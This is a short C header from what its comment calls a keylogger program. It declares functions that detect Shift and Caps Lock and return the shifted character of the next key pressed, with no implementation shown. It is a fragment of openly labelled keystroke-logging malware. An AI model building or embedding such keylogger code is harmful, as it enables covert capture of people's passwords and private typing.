/*
*    ``~ Definition file for find_shift_keys.h used within the keylogger program (Written by haeoro) ~``
*
*    findShiftPlusKey() is a function that is called when the shift key is pressed, this functions main purpose 
*    is to check for another key press then grab it's value.
*        
*    I.E. program has started, shift has been pressed, findShiftPlusKey() has been called, say I press o and capslock is disabled, 
*    findShiftKey will return 'O' to main.
*        
*    isShiftPressed() Checks if shift has been pressed. 
*    isCapslockOn() Checks if Capslock has been enabled.
*/

#pragma once

int isCapslockOn(int decimal_key_val);
int isShiftPressed();
int findShiftPlusKey();